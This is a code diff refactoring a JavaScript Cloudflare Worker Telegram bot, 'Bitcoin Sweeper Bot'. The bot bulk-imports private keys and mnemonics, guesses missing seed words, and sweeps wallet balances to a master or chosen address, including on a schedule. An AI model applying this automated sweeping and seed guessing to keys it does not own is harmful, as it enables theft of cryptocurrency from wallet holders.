-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ callback_query_id: update.callback_query.id })
-    });
+  let cid, text = '', cb = '';
+  if (update.message) { cid = update.message.chat.id; text = update.message.text || ''; }
+  else if (update.callback_query) {
+    cid = update.callback_query.message?.chat?.id || update.callback_query.from.id;
+    cb = update.callback_query.data;
+    fetch('https://api.telegram.org/bot' + env.TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: update.callback_query.id }) }).catch(() => {});
   }
-  if (!chatId) return;
+  if (!cid) return;
 
-  // ---- BUTTON HANDLERS ----
-  if (callbackData) {
-    switch (callbackData) {
-      case 'menu': case 'start':
-        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🤖 <b>Bitcoin Sweeper Bot</b>\n\nChoose an action:', mainMenuKeyboard());
-        break;
-      case 'import':
-        await sendMsg(TELEGRAM_BOT_TOKEN, chatId,
-          '🔑 Send me your key(s):\n\n' +
-          '<b>Single key:</b>\n• 12/24 word mnemonic\n• WIF (K/L/5/c/9)\n• Hex (64 chars)\n• xprv / yprv / zprv\n\n' +
-          '<b>Bulk import:</b>\nSeparate keys with commas:\n<code>key1,key2,key3</code>\n\n' +
-          'I scan multiple addresses like Trust Wallet.');
-        break;
-      case 'recover':
-        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🔍 <b>Seed Recovery</b>\n\nSyntax:\n/recover <pattern with ?> <word1,word2>\n\nExample:\n<code>/recover abandon abandon ? abandon abandon abandon abandon abandon abandon abandon abandon abandon word1,word2</code>');
-        break;
-      case 'list': {
-        const wallets = await getWallets(env, chatId);
-        if (wallets.length === 0) {
-          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📭 No wallets imported.');
-        } else {
-          let msg = '📋 <b>Your Wallets:</b>\n\n';
-          for (const w of wallets) msg += `🔹 <b>${w.label}</b>\n`;
-          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, msg);
-        }
-        break;
-      }
-      case 'remove': {
-        const wallets = await getWallets(env, chatId);
-        if (wallets.length === 0) {
-          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📭 <b>No wallets to remove.</b>\nImport a wallet first!');
-        } else {
-          const kb = wallets.map((w, i) => [{ text: `🗑️ ${w.label}`, callback_data: `del_${i}` }]);
-          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Select wallet to remove:', { inline_keyboard: kb });
-        }
-        break;
-      }
-      case 'addrecipient':
-        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '➕ Send me a Bitcoin address.\nExample: <code>bc1q...</code>');
-        break;
-      case 'sendto': {
-        const recipients = await getRecipients(env, chatId);
-        if (recipients.length === 0) {
-          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'No recipients yet. Add with /add <address>');
-        } else {
-          const kb = recipients.map((r, i) => [{ text: r.substring(0, 20) + '...', callback_data: `send_${i}` }]);
-          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Select recipient to sweep to:', { inline_keyboard: kb });
-        }
-        break;
-      }
-      case 'sweep':
-        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🧹 Sweeping all wallets to MASTER_ADDRESS...');
-        await sweepAll(env, chatId);
-        break;
-      case 'balance':
-        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📊 Send /balance to check all wallets.\nOr /balance <address> for a specific address.');
-        break;
-      case 'txs':
-        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🔍 Send /txs <address> to check latest transactions.');
-        break;
-      case 'pause':
-        await env.WALLETS.put('PAUSED', 'true');
-        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '⏸️ Sweeper paused.');
-        break;
-      case 'resume':
-        await env.WALLETS.put('PAUSED', 'false');
-        await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '▶️ Sweeper resumed.');
-        break;
-      case 'testapi': {
-        try {
-          const fee = await getRecommendedFee();
-          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `🧪 <b>API OK</b>\n💸 Fee: ${fee} sat/vB`);
-        } catch (e) {
-          await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `❌ API failed: ${e.message}`);
-        }
-        break;
-      }
-      default: {
-        if (callbackData.startsWith('del_')) {
-          const idx = parseInt(callbackData.split('_')[1]);
-          const wallets = await getWallets(env, chatId);
-          if (idx >= 0 && idx < wallets.length) {
-            const removed = wallets.splice(idx, 1)[0];
-            await saveWallets(env, chatId, wallets);
-            await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `🗑️ Removed <b>${removed.label}</b>`);
-          }
-        } else if (callbackData.startsWith('send_')) {
-          const idx = parseInt(callbackData.split('_')[1]);
-          const recipients = await getRecipients(env, chatId);
-          if (idx >= 0 && idx < recipients.length) {
-            await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `📤 Sweeping to <code>${recipients[idx]}</code>...`);
-            await sweepAll(env, chatId, recipients[idx]);
-          }
-        }
-      }
-    }
+  if (cb) {
+    if (cb === 'menu' || cb === 'start') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🤖 Bot', mainMenu());
+    if (cb === 'import') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Send key or comma separated keys.');
+    if (cb === 'recover') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Use: /recover <pattern with ?> <word1,word2>');
+    if (cb === 'list') { const w = await getWallets(env, cid); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, w.length ? w.map(x => '🔹 ' + x.label).join('\n') : '📭 Empty'); }
+    if (cb === 'remove') { const w = await getWallets(env, cid); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, w.length ? 'Select:' : '📭 <b>No wallets to remove.</b>\nImport first!', w.length ? { inline_keyboard: w.map((x, i) => [{ text: '🗑️ ' + x.label, callback_data: 'del_' + i }]) } : null); }
+    if (cb === 'sweep') { await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🧹 Sweeping...'); return await sweepAll(env, cid); }
+    if (cb === 'balance') return await checkAllBalances(env, cid);
+    if (cb === 'txs') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Use /txs <address>');
+    if (cb === 'addrecipient') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Send BTC address');
+    if (cb === 'sendto') { const r = await getRecipients(env, cid); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Select:', { inline_keyboard: r.map((x, i) => [{ text: x.slice(0, 20), callback_data: 'send_' + i }]) }); }
+    if (cb === 'pause') { await env.WALLETS.put('PAUSED', 'true'); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '⏸️'); }
+    if (cb === 'resume') { await env.WALLETS.put('PAUSED', 'false'); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '▶️'); }
+    if (cb === 'testapi') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🧪 Fee: ' + (await getRecommendedFee()));
+    if (cb.startsWith('del_')) { const i = +cb.slice(4), w = await getWallets(env, cid); if (i < w.length) { w.splice(i, 1); await saveWallets(env, cid, w); await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Removed'); } return; }
+    if (cb.startsWith('send_')) { const i = +cb.slice(5), r = await getRecipients(env, cid); if (i < r.length) { await sweepAll(env, cid, r[i]); } return; }
     return;
   }
 
-  // ---- TEXT COMMANDS ----
-  const trimmed = text.trim();
-  if (trimmed === '/start' || trimmed.startsWith('/start') || trimmed === '/menu') {
-    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🤖 <b>Bitcoin Sweeper Bot</b>\n\nChoose an action:', mainMenuKeyboard());
-    return;
+  const cmd = text.split(' ')[0].split('@')[0];
+  const args = text.split(' ').slice(1);
+  if (cmd === '/start' || cmd === '/menu') return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🤖 Bot', mainMenu());
+  if (cmd === '/balance') { if (args[0]) return await checkAddressBalance(env, cid, args[0]); return await checkAllBalances(env, cid); }
+  if (cmd === '/txs' || cmd === '/scan') { if (args[0]) return await checkAddressTxs(env, cid, args[0]); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Usage: /txs <address>'); }
+  if (cmd === '/recover') { if (args.length < 2) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Usage: /recover <pattern> <dict>'); return await recoverSeed(env, cid, args.slice(0, -1).join(' '), args[args.length - 1]); }
+  if (cmd === '/sweep') { await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '🧹'); return await sweepAll(env, cid); }
+  if (cmd === '/pause') { await env.WALLETS.put('PAUSED', 'true'); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '⏸️'); }
+  if (cmd === '/resume') { await env.WALLETS.put('PAUSED', 'false'); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '▶️'); }
+  if (cmd === '/list') { const w = await getWallets(env, cid); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, w.length ? w.map(x => '🔹 ' + x.label).join('\n') : '📭 Empty'); }
+  if (cmd === '/add') { if (!args[0] || !isValidAddress(args[0])) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌'); const r = await getRecipients(env, cid); if (!r.includes(args[0])) { r.push(args[0]); await saveRecipients(env, cid, r); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '✅ Added'); } return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Exists'); }
+  if (cmd === '/send') { if (!args[0] || !isValidAddress(args[0])) return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❌'); await sweepAll(env, cid, args[0]); return; }
+  
+  if (text.includes(',')) {
+    const keys = text.split(','); let ok = 0, fail = 0;
+    for (const k of keys) { const r = await importSingleKey(env, cid, k.trim()); r.ok ? ok++ : fail++; }
+    return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '📦 Done: ' + ok + ' ok, ' + fail + ' fail');
   }
 
-  if (trimmed.startsWith('/recover')) {
-    const parts = trimmed.split(' ');
-    if (parts.length < 3) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Usage: /recover <pattern with ?> <word1,word2>');
-      return;
-    }
-    const dict = parts.pop();
-    const pattern = parts.slice(1).join(' ');
-    await recoverSeed(env, chatId, pattern, dict);
-    return;
-  }
+  const type = detectKeyType(text);
+  if (['mnemonic', 'wif', 'hex', 'xprv', 'yprv', 'zprv', 'tprv'].includes(type)) { const r = await importSingleKey(env, cid, text); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, r.msg); }
+  if (type === 'address') { const r = await getRecipients(env, cid); if (!r.includes(text)) { r.push(text); await saveRecipients(env, cid, r); return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '✅ Added'); } return await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, 'Exists'); }
 
-  if (trimmed === '/balance') {
-    await checkAllBalances(env, chatId);
-    return;
-  }
-  if (trimmed.startsWith('/balance')) {
-    const parts = trimmed.split(' ');
-    if (parts.length > 1) {
-      await checkAddressInfo(env, chatId, parts[1], false);
-    } else {
-      await checkAllBalances(env, chatId);
-    }
-    return;
-  }
-
-  if (trimmed.startsWith('/txs')) {
-    const parts = trimmed.split(' ');
-    if (parts.length > 1) {
-      await checkAddressInfo(env, chatId, parts[1], true);
-    } else {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Usage: /txs <bitcoin_address>');
-    }
-    return;
-  }
-
-  if (trimmed.startsWith('/scan')) {
-    const parts = trimmed.split(' ');
-    if (parts.length > 1) {
-      await checkAddressInfo(env, chatId, parts[1], true);
-    } else {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Usage: /scan <bitcoin_address>');
-    }
-    return;
-  }
-
-  if (trimmed.startsWith('/add')) {
-    const parts = trimmed.split(' ');
-    if (parts.length < 2) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Usage: /add <bitcoin_address>');
-      return;
-    }
-    const addr = parts[1];
-    if (!isValidAddress(addr)) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ Invalid Bitcoin address.');
-      return;
-    }
-    const recipients = await getRecipients(env, chatId);
-    if (recipients.includes(addr)) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '⚠️ Already in recipient list.');
-    } else {
-      recipients.push(addr);
-      await saveRecipients(env, chatId, recipients);
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `✅ Recipient added: <code>${addr}</code>`);
-    }
-    return;
-  }
-
-  if (trimmed.startsWith('/remove')) {
-    const parts = trimmed.split(' ');
-    if (parts.length < 2) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Usage: /remove <bitcoin_address>');
-      return;
-    }
-    const addr = parts[1];
-    const recipients = await getRecipients(env, chatId);
-    const idx = recipients.indexOf(addr);
-    if (idx === -1) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ Address not found.');
-    } else {
-      recipients.splice(idx, 1);
-      await saveRecipients(env, chatId, recipients);
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `🗑️ Removed: <code>${addr}</code>`);
-    }
-    return;
-  }
-
-  if (trimmed === '/recipients') {
-    const recipients = await getRecipients(env, chatId);
-    if (recipients.length === 0) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📭 No recipients.');
-    } else {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '📤 <b>Recipients:</b>\n' + recipients.map(r => `<code>${r}</code>`).join('\n'));
-    }
-    return;
-  }
-
-  if (trimmed.startsWith('/send')) {
-    const parts = trimmed.split(' ');
-    if (parts.length < 2) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, 'Usage: /send <bitcoin_address>');
-      return;
-    }
-    const addr = parts[1];
-    if (!isValidAddress(addr)) {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❌ Invalid address.');
-      return;
-    }
-    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `📤 Sweeping to <code>${addr}</code>...`);
-    await sweepAll(env, chatId, addr);
-    return;
-  }
-
-  if (trimmed === '/sweep') {
-    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '🧹 Sweeping all wallets...');
-    await sweepAll(env, chatId);
-    return;
-  }
-
-  if (trimmed === '/pause') { await env.WALLETS.put('PAUSED', 'true'); await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '⏸️ Paused.'); return; }
-  if (trimmed === '/resume') { await env.WALLETS.put('PAUSED', 'false'); await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '▶️ Resumed.'); return; }
-  if (trimmed === '/list') {
-    const wallets = await getWallets(env, chatId);
-    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, wallets.length ? wallets.map(w => `🔹 ${w.label}`).join('\n') : '📭 No wallets.');
-    return;
-  }
-
-  if (trimmed.includes(',')) {
-    await importBulkKeys(env, chatId, trimmed);
-    return;
-  }
-
-  const keyType = detectKeyType(trimmed);
-  if (keyType === 'mnemonic' || keyType === 'wif' || keyType === 'hex' ||
-      keyType === 'xprv' || keyType === 'yprv' || keyType === 'zprv' || keyType === 'tprv') {
-    const result = await importSingleKey(env, chatId, trimmed);
-    await sendMsg(TELEGRAM_BOT_TOKEN, chatId, result.msg);
-    return;
-  }
-
-  if (keyType === 'address') {
-    const recipients = await getRecipients(env, chatId);
-    if (!recipients.includes(trimmed)) {
-      recipients.push(trimmed);
-      await saveRecipients(env, chatId, recipients);
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, `✅ Recipient added: <code>${trimmed}</code>`);
-    } else {
-      await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '⚠️ Already in list.');
-    }
-    return;
-  }
-
-  await sendMsg(TELEGRAM_BOT_TOKEN, chatId, '❓ Not understood. Use /start for menu.', mainMenuKeyboard());
+  await sendMsg(env.TELEGRAM_BOT_TOKEN, cid, '❓ Use /start', mainMenu());
 }
 
-// ============================================================
-// WORKER EXPORT (With Master Error Catcher)
-// ============================================================
 export default {
-  async scheduled(event, env, ctx) {
-    ctx.waitUntil(sweepAll(env, env.TELEGRAM_CHAT_ID));
-  },
+  async scheduled(event, env, ctx) { ctx.waitUntil(sweepAll(env, env.TELEGRAM_CHAT_ID)); },
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
-    const { pathname } = url;
-
-    if (request.method === 'POST' && pathname === '/telegram-webhook') {
-      const update = await request.json();
-      
-      // MASTER ERROR CATCHER: Prevents silent background crashes
-      ctx.waitUntil((async () => {
-        try {
-          await handleTelegramUpdate(update, env);
-        } catch (e) {
-          console.error("BACKGROUND CRASH:", e);
-          const chatId = update.message?.chat?.id || update.callback_query?.message?.chat?.id || update.callback_query?.from?.id;
-          if (chatId && env.TELEGRAM_BOT_TOKEN) {
-            await sendMsg(env.TELEGRAM_BOT_TOKEN, chatId, `❌ Bot crashed: ${e.message}`);
-          }
-        }
-      })());
-      
+    if (request.method === 'POST' && url.pathname === '/telegram-webhook') {
+      try {
+        const update = await request.json();
+        ctx.waitUntil((async () => {
+          try { await handleUpdate(update, env); } catch (e) { console.error(e); }
+        })());
+      } catch (e) { console.error(e); }
       return new Response('OK');
     }
-
-    if (request.headers.get('Authorization') !== `Bearer ${env.ADMIN_TOKEN}`) {
-      return new Response('Unauthorized', { status: 401 });
-    }
-
-    if (request.method === 'POST' && pathname === '/sweep') {
-      const chatId = url.searchParams.get('chatId') || env.TELEGRAM_CHAT_ID;
-      const to = url.searchParams.get('to') || null;
-      ctx.waitUntil(sweepAll(env, chatId, to));
-      return new Response('Sweep triggered');
-    }
-    if (request.method === 'POST' && pathname === '/pause') {
-      await env.WALLETS.put('PAUSED', 'true');
-      return new Response('Paused');
-    }
-    if (request.method === 'POST' && pathname === '/resume') {
-      await env.WALLETS.put('PAUSED', 'false');
-      return new Response('Resumed');
-    }
-
+    if (request.headers.get('Authorization') !== 'Bearer ' + env.ADMIN_TOKEN) return new Response('Unauthorized', { status: 401 });
     return new Response('Not found', { status: 404 });
   }
 };
